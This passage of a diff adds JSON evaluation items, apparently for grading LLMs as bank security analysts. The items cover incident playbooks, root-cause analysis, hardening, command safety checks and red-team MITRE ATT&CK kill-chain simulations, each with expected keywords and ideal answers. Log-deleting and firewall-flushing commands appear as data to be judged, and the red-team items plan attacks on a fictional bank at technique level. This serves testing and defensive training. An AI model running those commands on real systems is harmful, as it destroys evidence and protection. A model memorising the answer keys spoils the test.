+        "completeness": "Must connect all 5 data points into coherent prediction",
+        "recommendation": "Must recommend keeping full SOC tonight"
+      },
+      "ideal_answer_summary": "High probability attack tonight. Pattern: escalating Mon-Thu recon = final preparation. 18:00 SOC reduction = attacker's window. Neighbouring bank breach last Friday = same actor testing TTPs. 2 unpatched CVEs = known entry points. Recommendation: maintain full SOC, emergency CVE patching."
+    },
+
+    {
+      "id": "TC-023",
+      "category": "kill_switch_playbook",
+      "difficulty": "medium",
+      "ps_requirement": "PS#7",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nConfirmed attack: {\"type\": \"SQL Injection\", \"status\": \"active\", \"target\": \"/login\", \"attacker_ip\": \"185.220.101.45\", \"evidence\": \"SELECT * from customers dumped\", \"records_exposed\": 8000}\n\nGenerate a Kill Switch remediation playbook. This will be shown to the analyst who must approve and deploy it. Respond in JSON with steps array. Each step: {\"step\": int, \"priority\": \"immediate|short-term\", \"action\": str, \"command\": str or null, \"team\": str, \"estimated_minutes\": int}",
+      "expected_keywords_in_response": ["immediate", "block", "185.220.101.45", "iptables", "WAF", "preserve logs", "notify", "GDPR", "steps", "command", "team", "requires_approval"],
+      "evaluation_criteria": {
+        "format": "Valid JSON with steps array, all required fields per step",
+        "accuracy": "IP block must be step 1",
+        "completeness": "Must include containment, evidence, notification",
+        "legal": "Must mention GDPR/regulatory notification for 8000 records"
+      },
+      "ideal_answer_summary": "Step 1: iptables block IP (immediate, ops, 2min). Step 2: Preserve DB audit logs (immediate, forensics, 5min). Step 3: WAF SQL injection rule (immediate, security, 5min). Step 4: Notify legal re 8000 records GDPR (immediate, legal). Step 5: Prepared statements patch (short-term, dev)."
+    },
+
+    {
+      "id": "TC-024",
+      "category": "kill_switch_playbook",
+      "difficulty": "hard",
+      "ps_requirement": "PS#7",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nMulti-vector attack confirmed RIGHT NOW:\n{\"attack_1\": {\"type\": \"Log4Shell RCE\", \"host\": \"10.0.0.5\", \"status\": \"exploiting\"},\n\"attack_2\": {\"type\": \"Privilege escalation to root\", \"host\": \"10.0.0.8\", \"status\": \"completed\"},\n\"attack_3\": {\"type\": \"Database exfiltration\", \"host\": \"10.0.0.10\", \"records_per_second\": 200, \"status\": \"active\"}}\n\nTime critical — exfiltration is ONGOING. Generate emergency Kill Switch playbook. Stopping the data leak is the absolute priority.",
+      "expected_keywords_in_response": ["stop exfiltration", "block outbound", "10.0.0.10", "isolate", "immediate", "emergency", "200 records per second", "parallel", "forensic snapshot", "3 servers"],
+      "evaluation_criteria": {
+        "accuracy": "Must prioritise stopping DB exfiltration above all else",
+        "urgency": "Time-critical framing throughout",
+        "completeness": "Must address all 3 simultaneous attack vectors",
+        "parallel": "Must recognise isolation of 10.0.0.10 and 10.0.0.5 can happen in parallel"
+      },
+      "ideal_answer_summary": "PARALLEL IMMEDIATE: Block all outbound from 10.0.0.10 (stop leak). Isolate 10.0.0.5 (stop RCE). Then: forensic snapshot 10.0.0.8 (root compromise). Assess leak volume: 200 rec/sec = ~12,000/min already stolen."
+    },
+
+    {
+      "id": "TC-025",
+      "category": "kill_switch_playbook",
+      "difficulty": "medium",
+      "ps_requirement": "PS#7",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nLeaked credentials found by SpiderFoot:\n{\"type\": \"LEAKED_CREDS\", \"count\": 5, \"accounts\": [\"admin@altoro.com\", \"cfo@altoro.com\", \"dev1@altoro.com\", \"staff2@altoro.com\", \"dba@altoro.com\"]}\n\nGenerate an emergency credential compromise response playbook in JSON format with prioritised steps.",
+      "expected_keywords_in_response": ["force reset", "MFA", "admin", "CFO", "DBA", "session invalidation", "audit logs", "priority", "emergency", "check reuse", "notify"],
+      "evaluation_criteria": {
+        "accuracy": "Must treat admin, CFO, and DBA as highest priority accounts",
+        "completeness": "Must include session invalidation, audit review, and MFA enforcement",
+        "urgency": "Emergency framing — these credentials may already be in use"
+      },
+      "ideal_answer_summary": "Priority 1: Force reset admin + CFO + DBA (highest privilege). Invalidate all active sessions. Enable MFA on all 5 accounts. Check audit logs for suspicious activity since credentials appeared in breach DB. Check password reuse on other systems."
+    },
+
+    {
+      "id": "TC-026",
+      "category": "kill_switch_playbook",
+      "difficulty": "hard",
+      "ps_requirement": "PS#7",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nRansomware detected across 3 servers:\n{\"type\": \"Ransomware\", \"affected\": [\"web-server\", \"app-server\", \"file-server\"], \"encryption_start\": \"23:00\", \"ransom_note\": true, \"backup_age\": \"18 hours\", \"services_down\": true, \"customer_impact\": \"banking portal offline\"}\n\nGenerate complete ransomware Kill Switch playbook.",
+      "expected_keywords_in_response": ["isolate", "disconnect network", "do not pay", "backup restore", "18 hours", "business continuity", "FBI", "forensic", "communication plan", "recovery time objective"],
+      "evaluation_criteria": {
+        "accuracy": "Network isolation must be step 1",
+        "completeness": "Must cover containment, eradication, recovery, communication, legal",
+        "ransomware_specific": "Must address ransom payment decision and backup restoration"
+      },
+      "ideal_answer_summary": "Step 1: Isolate all 3 servers from network (kill switches). Do NOT pay ransom. Activate business continuity. Restore from 18hr backup (assess data loss window). Notify regulators and customers. Report to FBI Cybercrime. Full forensic investigation of entry point."
+    },
+
+    {
+      "id": "TC-027",
+      "category": "incident_response",
+      "difficulty": "easy",
+      "ps_requirement": "PS#8",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nActive incident: {\"type\": \"Brute Force Login\", \"target\": \"/login\", \"source_ip\": \"45.33.22.11\", \"attempts\": 280, \"duration\": \"5 minutes\", \"status\": \"ongoing\"}\n\nGenerate immediate incident response procedure.",
+      "expected_keywords_in_response": ["block IP", "lockout", "alert SOC", "monitor", "MFA", "CAPTCHA", "rate limiting", "escalate", "log", "notify"],
+      "evaluation_criteria": {
+        "accuracy": "IP block must be first step",
+        "completeness": "Must include containment, eradication, recovery phases",
+        "urgency": "Must treat as active/ongoing incident"
+      },
+      "ideal_answer_summary": "Step 1: Block IP 45.33.22.11 at firewall immediately. Step 2: Enable CAPTCHA + account lockout after 5 attempts. Step 3: Alert SOC. Step 4: Review all accounts targeted. Step 5: Implement rate limiting. Step 6: Review for other attack vectors from same IP."
+    },
+
+    {
+      "id": "TC-028",
+      "category": "incident_response",
+      "difficulty": "medium",
+      "ps_requirement": "PS#8",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nAlert: {\"type\": \"Privilege Escalation\", \"user\": \"app_service\", \"action\": \"sudo su root\", \"host\": \"app-server\", \"time\": \"03:42 AM\", \"prior_activity\": \"none in 6 hours\"}\n\nService accounts should never escalate to root. Generate incident response procedure.",
+      "expected_keywords_in_response": ["suspicious", "off-hours", "isolate", "investigate", "forensic", "compromise", "service account", "memory dump", "assume breach", "3:42 AM"],
+      "evaluation_criteria": {
+        "accuracy": "Must flag 3:42 AM off-hours service account root escalation as critical",
+        "completeness": "Containment + forensic preservation + investigation steps",
+        "forensic": "Must recommend preserving system state before changes"
+      },
+      "ideal_answer_summary": "High suspicion: service accounts never need root, off-hours. Assume compromise until proven otherwise. Immediately isolate app-server. Preserve memory dump and logs. Investigate what triggered sudo. Check for lateral movement."
+    },
+
+    {
+      "id": "TC-029",
+      "category": "incident_response",
+      "difficulty": "hard",
+      "ps_requirement": "PS#8",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nDDoS in progress: {\"type\": \"HTTP Flood\", \"rps\": 55000, \"unique_source_ips\": 650, \"target\": \"/login\", \"response_time\": \"35+ seconds\", \"duration\": \"52 minutes\", \"customer_impact\": \"login page unreachable\"}\n\nGenerate incident response procedure for active distributed DDoS attack.",
+      "expected_keywords_in_response": ["CDN", "Cloudflare", "scrubbing", "blackhole routing", "upstream ISP", "CAPTCHA", "rate limit", "customer communication", "SLA", "distributed — IP blocking ineffective"],
+      "evaluation_criteria": {
+        "accuracy": "Must recommend CDN/scrubbing centre as primary mitigation",
+        "completeness": "Technical mitigation + customer communication + ISP contact",
+        "realism": "Must acknowledge IP blocking is ineffective for 650+ distributed sources"
+      },
+      "ideal_answer_summary": "Contact upstream ISP for BGP blackhole routing. Enable Cloudflare DDoS scrubbing. CAPTCHA on login. Rate limiting by geo. Customer communication via alternate channels. Post-incident: dedicated DDoS protection service contract."
+    },
+
+    {
+      "id": "TC-030",
+      "category": "incident_response",
+      "difficulty": "hard",
+      "ps_requirement": "PS#8",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nInsider threat: {\"user\": \"emp_332\", \"role\": \"database_admin\", \"action\": \"exported 50,000 customer records to personal USB\", \"time\": \"17:58 (2 min before end of shift)\", \"employee_status\": \"resignation submitted 3 days ago\", \"data_type\": \"customer PII + account numbers\"}\n\nGenerate incident response procedure for insider data theft.",
+      "expected_keywords_in_response": ["revoke access", "USB evidence", "chain of custody", "HR", "legal", "GDPR", "50,000 records", "offboarding checklist", "preserve evidence", "DLP"],
+      "evaluation_criteria": {
+        "accuracy": "Must immediately revoke all access as first step",
+        "completeness": "Must involve HR, Legal, preserve forensic evidence, GDPR assessment",
+        "legal": "Must mention data breach notification obligations for 50K records"
+      },
+      "ideal_answer_summary": "Step 1: Revoke all system access immediately. Step 2: Secure USB as forensic evidence (chain of custody). Step 3: Involve HR and Legal. Step 4: GDPR 72-hour notification assessment (50K PII records). Step 5: Review last 3 days' access logs. Step 6: Update offboarding security checklist."
+    },
+
+    {
+      "id": "TC-031",
+      "category": "root_cause_analysis",
+      "difficulty": "easy",
+      "ps_requirement": "PS#9",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nPost-Kill-Switch incident timeline:\n[{\"time\": \"21:00\", \"event\": \"Port scan from 45.33.22.11\"}, {\"time\": \"21:15\", \"event\": \"50 failed logins on /admin\"}, {\"time\": \"21:30\", \"event\": \"Successful admin login from 45.33.22.11\"}, {\"time\": \"21:35\", \"event\": \"Admin password changed\"}, {\"time\": \"21:40\", \"event\": \"New backdoor admin account created\"}, {\"time\": \"21:55\", \"event\": \"Kill Switch approved and deployed — attacker blocked\"}]\n\nPerform root cause analysis.",
+      "expected_keywords_in_response": ["root cause", "weak password", "no lockout policy", "reconnaissance", "brute force", "account takeover", "persistence", "MTTD", "timeline", "prevention"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify missing lockout policy as root cause",
+        "completeness": "Must walk through each timeline event",
+        "lessons": "Must recommend MFA + lockout as preventive measures"
+      },
+      "ideal_answer_summary": "Root cause: No account lockout policy + weak admin password. Kill chain: recon → brute force (15 min success) → admin takeover → persistence via new account. Prevention: account lockout after 5 attempts + MFA mandatory for admin."
+    },
+
+    {
+      "id": "TC-032",
+      "category": "root_cause_analysis",
+      "difficulty": "medium",
+      "ps_requirement": "PS#9",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nCustomer reported $5,000 unauthorised transfer. Investigation logs:\n[{\"time\": \"14:00\", \"event\": \"Customer logged in from home IP\"}, {\"time\": \"14:01\", \"event\": \"Session cookie transmitted over HTTP (not HTTPS)\"}, {\"time\": \"14:03\", \"event\": \"Login from new IP 45.33.22.11 using same session\"}, {\"time\": \"14:05\", \"event\": \"$5,000 transfer initiated and completed\"}]\n\nPerform root cause analysis of this financial fraud.",
+      "expected_keywords_in_response": ["session hijacking", "HTTP", "cookie theft", "man in the middle", "root cause", "HTTPS", "Secure flag", "HSTS", "timeline", "$5,000"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify HTTP cookie transmission as root cause",
+        "completeness": "Must trace full timeline with causal links",
+        "remediation": "Must explain HTTPS + Secure flag + HSTS as fix"
+      },
+      "ideal_answer_summary": "Root cause: Session cookie sent over HTTP = intercepted via MitM. Attacker reused stolen cookie 2 minutes later to authorise $5,000 transfer. Fix: Force HTTPS everywhere, Secure cookie flag, HSTS header, session IP binding."
+    },
+
+    {
+      "id": "TC-033",
+      "category": "root_cause_analysis",
+      "difficulty": "hard",
+      "ps_requirement": "PS#9",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nPost-breach reconstruction:\n{\"march_1\": \"SpiderFoot detected leaked credentials on dark web\",\n\"march_1_action\": \"Alert generated but not acted upon — no automated remediation\",\n\"march_5\": \"VPN login with stolen credentials from Russia\",\n\"march_6\": \"Attacker ran internal nmap scan\",\n\"march_8\": \"Log4j exploited on internal server\",\n\"march_10\": \"Database dumped — 45,000 customer records\",\n\"march_13\": \"Customer fraud complaints triggered investigation\"}\n\nWrite a full root cause analysis report with lessons learned.",
+      "expected_keywords_in_response": ["12 days", "dwell time", "dark web alert ignored", "primary failure", "no automated response", "credential reset", "lessons learned", "process failure", "MTTD", "MTTR"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify ignoring dark web alert on March 1 as primary failure",
+        "completeness": "Must cover full 12-day timeline with causal analysis",
+        "lessons": "Must provide at least 5 specific actionable lessons"
+      },
+      "ideal_answer_summary": "Primary failure: Dark web credential alert not acted upon. 12-day dwell time. 5 lessons: automated credential reset on dark web detection, VPN geo-restriction, internal anomaly detection, Log4j patching, SIEM alerting for unusual internal scanning."
+    },
+
+    {
+      "id": "TC-034",
+      "category": "config_recommendations",
+      "difficulty": "easy",
+      "ps_requirement": "PS#10",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nnmap result: {\"host\": \"web-server\", \"open_ports\": [21, 22, 23, 80, 443, 3306, 8080, 8443]}\n\nGenerate specific firewall configuration changes to harden this server.",
+      "expected_keywords_in_response": ["close FTP 21", "Telnet 23", "MySQL 3306", "firewall rule", "iptables", "restrict SSH 22", "internal only", "whitelist", "443"],
+      "evaluation_criteria": {
+        "accuracy": "Must recommend closing FTP 21, Telnet 23, MySQL 3306 as priority",
+        "completeness": "Must address all 8 ports with specific action",
+        "specificity": "Must provide actual firewall rule suggestions or iptables syntax"
+      },
+      "ideal_answer_summary": "Close: 21 (FTP - use SFTP), 23 (Telnet - use SSH), 3306 (MySQL - internal only, bind to localhost), 8080 (redirect to 8443 or close). Restrict 22 to specific management IPs. Keep 80 (redirect to 443), 443, 8443."
+    },
+
+    {
+      "id": "TC-035",
+      "category": "config_recommendations",
+      "difficulty": "medium",
+      "ps_requirement": "PS#10",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nSecurity headers audit: {\"X-Frame-Options\": \"missing\", \"Content-Security-Policy\": \"missing\", \"X-XSS-Protection\": \"missing\", \"Strict-Transport-Security\": \"missing\", \"X-Content-Type-Options\": \"missing\", \"Referrer-Policy\": \"missing\"}\n\nGenerate exact web server configuration to add all missing security headers. Include both nginx and Apache config.",
+      "expected_keywords_in_response": ["X-Frame-Options DENY", "HSTS", "max-age", "Content-Security-Policy", "X-Content-Type-Options nosniff", "nginx", "Apache", "add_header", "Header always set"],
+      "evaluation_criteria": {
+        "accuracy": "Must provide correct header values for all 6",
+        "completeness": "Must give both nginx and Apache config syntax",
+        "specificity": "Must include actual config file lines, not just descriptions"
+      },
+      "ideal_answer_summary": "nginx: add_header X-Frame-Options DENY; add_header Strict-Transport-Security max-age=31536000; add_header X-Content-Type-Options nosniff; add_header Content-Security-Policy default-src self; Apache equivalents with Header always set."
+    },
+
+    {
+      "id": "TC-036",
+      "category": "config_recommendations",
+      "difficulty": "hard",
+      "ps_requirement": "PS#10",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nAWS EC2 security audit: {\"security_groups\": \"0.0.0.0/0 allowed on all ports\", \"S3_bucket\": \"public read on customer backup bucket\", \"IAM\": \"EC2 instance role has AdministratorAccess\", \"CloudTrail\": \"disabled\", \"EBS\": \"unencrypted volumes\", \"RDS\": \"publicly accessible, default credentials\"}\n\nGenerate AWS hardening recommendations with specific CLI commands where possible.",
+      "expected_keywords_in_response": ["security group", "least privilege", "S3 Block Public Access", "IAM role", "CloudTrail enable", "EBS encryption", "RDS disable public", "aws cli", "CIS benchmark", "AdministratorAccess"],
+      "evaluation_criteria": {
+        "accuracy": "Must address all 6 misconfigurations",
+        "specificity": "Must include AWS CLI commands",
+        "priority": "S3 public backup + AdministratorAccess = most critical"
+      },
+      "ideal_answer_summary": "Critical: S3 block-public-access enable (customer backups exposed!), remove AdministratorAccess IAM. High: Security groups — specific ports only, no 0.0.0.0/0. Enable CloudTrail. EBS encryption at rest. RDS: disable public access, rotate credentials."
+    },
+
+    {
+      "id": "TC-037",
+      "category": "threat_landscape",
+      "difficulty": "medium",
+      "ps_requirement": "PS#1",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nWeekly security metrics: {\"critical_vulns\": 3, \"high_vulns\": 9, \"open_incidents\": 4, \"failed_logins\": 520, \"port_scans\": 15, \"phishing_blocked\": 6, \"data_exfil_attempts\": 1, \"dark_web_mentions\": 2}\n\nGenerate a threat landscape summary with overall risk score (0-100) and top 3 priorities.",
+      "expected_keywords_in_response": ["risk score", "data exfiltration", "dark web", "threat landscape", "top 3", "critical", "active targeting", "520 failed", "recommendations"],
+      "evaluation_criteria": {
+        "accuracy": "Must weight data exfiltration attempt as highest severity",
+        "completeness": "Must address all 8 metrics",
+        "scoring": "Risk score must be justified by the data — should be 75-85 given these metrics"
+      },
+      "ideal_answer_summary": "Risk score: 79/100 (High). Data exfiltration attempt + 2 dark web mentions = active targeting. Top 3: 1) Data exfil investigation, 2) Patch 3 critical CVEs, 3) Dark web intel response. Bank is under active reconnaissance."
+    },
+
+    {
+      "id": "TC-038",
+      "category": "threat_landscape",
+      "difficulty": "hard",
+      "ps_requirement": "PS#1",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nBoard-level threat briefing request. Intelligence:\n{\"external\": {\"apt_group\": \"FIN7 active in region targeting banks\", \"phishing_kit\": \"Altoro Mutual branded kit found on GitHub\", \"leaked_creds\": 5, \"darkweb_mentions\": 2},\n\"internal\": {\"critical_cves_unpatched\": 3, \"no_mfa\": true, \"outdated_systems\": 4, \"backup_untested\": true},\n\"recent\": {\"port_scans_this_week\": 28, \"failed_logins\": 820, \"data_exfil_attempt\": 1}}\n\nWrite a board-level threat landscape briefing — non-technical executives audience.",
+      "expected_keywords_in_response": ["FIN7", "APT", "advanced persistent threat", "phishing kit", "business risk", "financial impact", "board", "MFA", "immediate action", "breach probability"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify FIN7 as a known banking threat actor",
+        "completeness": "Must cover all three intelligence categories",
+        "executive_audience": "Must be written for non-technical C-suite — no jargon without explanation"
+      },
+      "ideal_answer_summary": "Board briefing: FIN7 criminal group actively targeting banks in our region. Custom phishing kit built for our bank = targeted campaign. No MFA = critical gap. 3 critical vulnerabilities unpatched. Recommendation: Emergency 48-hour security sprint. Financial risk: potential breach cost $2-5M."
+    },
+
+    {
+      "id": "TC-039",
+      "category": "defense_gap",
+      "difficulty": "medium",
+      "ps_requirement": "PS#12",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nSecurity control test results:\n[\n  {\"control\": \"WAF\", \"test\": \"SQL injection with URL encoding bypass\", \"result\": \"BYPASSED\"},\n  {\"control\": \"IDS\", \"test\": \"Slow port scan (1 packet/min)\", \"result\": \"NOT DETECTED\"},\n  {\"control\": \"Email filter\", \"test\": \"Phishing email with known payload\", \"result\": \"BLOCKED\"},\n  {\"control\": \"MFA\", \"test\": \"Login with stolen password only\", \"result\": \"BLOCKED\"},\n  {\"control\": \"DLP\", \"test\": \"Email 1000 customer records as attachment\", \"result\": \"NOT DETECTED\"}\n]\n\nAnalyse which controls are effective and identify the gaps.",
+      "expected_keywords_in_response": ["WAF bypass", "encoding", "IDS slow scan", "DLP gap", "email filter working", "MFA working", "tuning", "false negative", "reconfigure", "priority fix"],
+      "evaluation_criteria": {
+        "accuracy": "Must correctly identify 3 failing and 2 passing controls",
+        "completeness": "Must explain why each control failed",
+        "recommendations": "Must suggest specific fixes for each failing control"
+      },
+      "ideal_answer_summary": "Working: Email filter, MFA. Failed: WAF (needs encoding-aware ruleset), IDS (needs behavioural detection not just signature), DLP (needs content inspection for PII patterns). Priority: DLP gap = data exfiltration undetectable."
+    },
+
+    {
+      "id": "TC-040",
+      "category": "defense_gap",
+      "difficulty": "hard",
+      "ps_requirement": "PS#12",
+      "model_target": "deepseek-v3.2",
+      "platform": "nvidia_nim",
+      "prompt": "You are a senior cybersecurity analyst for a bank.\n\nAnnual penetration test results:\n{\"year\": 2026, \"critical_findings\": 4, \"high_findings\": 11, \"same_as_last_year\": 9, \"new_findings\": 6, \"remediated_from_last_year\": 2, \"overall_score\": \"39/100\"}\n\nThis is the second consecutive annual pentest. Analyse the trend and generate an executive report with security improvement roadmap.",
+      "expected_keywords_in_response": ["9 repeat findings", "remediation failure", "systemic", "score 39", "roadmap", "quarterly", "accountability", "regression", "C-suite", "pentest"],
+      "evaluation_criteria": {
+        "accuracy": "Must highlight 9 repeat findings as systemic remediation failure",
+        "completeness": "Trend analysis + roadmap + executive framing",
+        "roadmap": "Must include quarterly milestones and ownership"
+      },
+      "ideal_answer_summary": "Critical concern: 9 of last year's findings unresolved = remediation process broken. Score 39/100 unacceptable. New findings = attack surface growing. Q1: fix all 4 criticals. Q2: fix all 11 highs. Q3: process overhaul. Q4: retest target 70+."
+    },
+
+    {
+      "id": "TC-041",
+      "category": "safety_verification",
+      "difficulty": "easy",
+      "ps_requirement": "PS#7",
+      "model_target": "nemotron-content-safety-reasoning-4b",
+      "platform": "nvidia_nim",
+      "prompt": "You are a security playbook safety verifier. Review this remediation command and confirm it is safe to execute on a production banking server. Respond in JSON: {\"safe\": bool, \"risk\": \"none|low|medium|high\", \"concern\": str or null, \"approved\": bool}\n\nCommand: \"iptables -A INPUT -s 185.220.101.45 -j DROP\"",
+      "expected_keywords_in_response": ["safe", "true", "risk", "low", "approved", "true", "block", "specific IP"],
+      "evaluation_criteria": {
+        "accuracy": "Must approve — blocking a single specific IP is safe",
+        "format": "Valid JSON with all 4 fields",
+        "reasoning": "Must confirm this is a targeted block, not disruptive"
+      },
+      "ideal_answer_summary": "safe: true, risk: low, concern: null, approved: true. Blocks single attacker IP. Does not affect legitimate traffic."
+    },
+
+    {
+      "id": "TC-042",
+      "category": "safety_verification",
+      "difficulty": "medium",
+      "ps_requirement": "PS#7",
+      "model_target": "nemotron-content-safety-reasoning-4b",
+      "platform": "nvidia_nim",
+      "prompt": "You are a security playbook safety verifier. Review this remediation command and confirm it is safe to execute on a production banking server. Respond in JSON: {\"safe\": bool, \"risk\": \"none|low|medium|high\", \"concern\": str or null, \"approved\": bool}\n\nCommand: \"iptables -F\" (flush all firewall rules)",
+      "expected_keywords_in_response": ["safe", "false", "risk", "high", "approved", "false", "concern", "flush", "all rules", "production", "exposure"],
+      "evaluation_criteria": {
+        "accuracy": "Must reject — flushing all iptables rules exposes server completely",
+        "format": "Valid JSON",
+        "reasoning": "Must explain this removes ALL firewall protection"
+      },
+      "ideal_answer_summary": "safe: false, risk: high, concern: Flushing all iptables rules removes ALL firewall protection, exposing server to internet. approved: false. Safer alternative: iptables -D INPUT to remove specific rule only."
+    },
+
+    {
+      "id": "TC-043",
+      "category": "safety_verification",
+      "difficulty": "hard",
+      "ps_requirement": "PS#7",
+      "model_target": "nemotron-content-safety-reasoning-4b",
+      "platform": "nvidia_nim",
+      "prompt": "You are a security playbook safety verifier. Review this remediation batch and identify which commands are safe and which are dangerous. Respond in JSON array.\n\nCommands:\n1. \"systemctl stop apache2\"\n2. \"rm -rf /var/log/apache2/\"\n3. \"mysqladmin -u root flush-logs\"\n4. \"kill -9 $(pgrep java)\"\n5. \"ufw allow from 10.0.0.0/24 to any port 3306\"\n\nFor each: {\"cmd_id\": int, \"safe\": bool, \"risk\": str, \"concern\": str, \"approved\": bool}",
+      "expected_keywords_in_response": ["cmd_id", "safe", "false", "apache2", "rm -rf", "logs destroyed", "forensic", "kill java", "services down", "approved", "concern"],
+      "evaluation_criteria": {
+        "accuracy": "Must flag: 1=medium risk (downtime), 2=dangerous (destroys forensic evidence), 4=high risk (kills all Java processes including bank app)",
+        "completeness": "All 5 commands assessed",
+        "forensic_awareness": "Must flag log deletion as destroying forensic evidence"
+      },
+      "ideal_answer_summary": "1: medium/approved with caveat (downtime). 2: NOT APPROVED — destroys forensic evidence. 3: low/approved. 4: NOT APPROVED — kills all Java including bank application. 5: approved — restricts MySQL to internal network."
+    },
+
+    {
+      "id": "TC-044",
+      "category": "red_team_mitre",
+      "difficulty": "medium",
+      "ps_requirement": "PS#11",
+      "model_target": "nemotron-3-super-120b-a12b",
+      "platform": "nvidia_nim",
+      "prompt": "You are a red team AI conducting MITRE ATT&CK simulation on Altoro Mutual bank.\n\nPhase: Initial Access\nAvailable techniques: T1190 (Exploit Public App), T1566 (Phishing), T1078 (Valid Accounts)\n\nIntel: {\"sql_injection\": \"/login\", \"xss\": \"/search\", \"leaked_emails\": [\"admin@altoro.com\"], \"phishing_kit_found\": true}\n\nSelect optimal initial access technique and justify. Respond in JSON: {\"technique\": str, \"mitre_id\": str, \"justification\": str, \"next_phase\": str, \"success_probability\": float}",
+      "expected_keywords_in_response": ["T1190", "SQL injection", "mitre_id", "next_phase", "success_probability", "justification", "exploit", "technical"],
+      "evaluation_criteria": {
+        "accuracy": "Must choose T1190 SQL injection given confirmed vulnerability",
+        "format": "Valid JSON with all fields",
+        "reasoning": "Must explain why technical exploit beats phishing given available intelligence"
+      },
+      "ideal_answer_summary": "technique: Exploit Public-Facing Application, mitre_id: T1190, justification: SQL injection confirmed on /login — more reliable than phishing, no victim action needed. next_phase: Execution. success_probability: 0.89."
+    },
+
+    {
+      "id": "TC-045",
+      "category": "red_team_mitre",
+      "difficulty": "hard",
+      "ps_requirement": "PS#11",
+      "model_target": "nemotron-3-super-120b-a12b",
+      "platform": "nvidia_nim",
+      "prompt": "You are a red team AI conducting full MITRE ATT&CK kill chain simulation on Altoro Mutual bank.\n\nCompleted phases:\n- T1190 SQL injection — SUCCESS — extracted DB schema\n- T1552 Found admin:p@ssw0rd123 in config table — SUCCESS\n- T1078 Admin login successful — SUCCESS\n\nSimulate next 3 MITRE phases (Persistence, Privilege Escalation, Lateral Movement). For each: {\"phase\": str, \"technique_id\": str, \"technique_name\": str, \"action\": str, \"target\": str, \"success_probability\": float}",
+      "expected_keywords_in_response": ["Persistence", "Privilege Escalation", "Lateral Movement", "T1136", "T1078", "T1021", "success_probability", "backdoor", "admin account", "lateral"],
+      "evaluation_criteria": {
+        "accuracy": "Must select correct MITRE techniques for each phase",
+        "format": "Valid JSON array with all required fields",
+        "chain_logic": "Each phase must logically build on previous"
+      },
+      "ideal_answer_summary": "Persistence: T1136 Create Account (backdoor admin). PrivEsc: T1078 use admin credentials for system-level access. Lateral Movement: T1021 Remote Services — use admin creds to access app server. All chain logically."
+    },
+
+    {
+      "id": "TC-046",
+      "category": "red_team_mitre",
+      "difficulty": "hard",
+      "ps_requirement": "PS#11",
+      "model_target": "nemotron-3-super-120b-a12b",
+      "platform": "nvidia_nim",
+      "prompt": "You are a red team AI. Full kill chain simulation on Altoro Mutual bank is complete.\n\nSimulation results:\n{\"T1190_initial_access\": \"SUCCESS\", \"T1059_execution\": \"SUCCESS\", \"T1136_persistence\": \"SUCCESS — UNDETECTED\", \"T1078_priv_esc\": \"SUCCESS — UNDETECTED\", \"T1021_lateral_movement\": \"FAILED — WAF blocked\", \"T1005_collection\": \"NOT REACHED\"}\n\nGenerate purple team report: defences that worked, defences that failed, kill chain break point, top 3 security gaps, bank security grade A-F.",
+      "expected_keywords_in_response": ["WAF", "blocked", "lateral movement", "kill chain broken", "undetected persistence", "undetected priv esc", "gaps", "grade", "IDS", "SIEM missing", "purple team"],
+      "evaluation_criteria": {
+        "accuracy": "Must identify WAF as working defence",
+        "completeness": "All 5 required sections present",
+        "grade": "Must justify grade — D or F given persistence and priv esc went undetected",
+        "purple_team": "Must provide both attacker and defender perspective"
+      },
+      "ideal_answer_summary": "Working: WAF (stopped lateral movement). Failed: No detection for initial access, execution, persistence, priv esc — all 4 undetected. Kill chain broken at T1021. Gaps: 1) No IDS/SIEM 2) SQLi prevention 3) Privilege monitoring. Grade: D (WAF only working control, 4 phases undetected)."
+    },
+
+    {
+      "id": "TC-047",
+      "category": "red_team_mitre",
+      "difficulty": "hard",
+      "ps_requirement": "PS#11",
+      "model_target": "nemotron-3-super-120b-a12b",
+      "platform": "nvidia_nim",
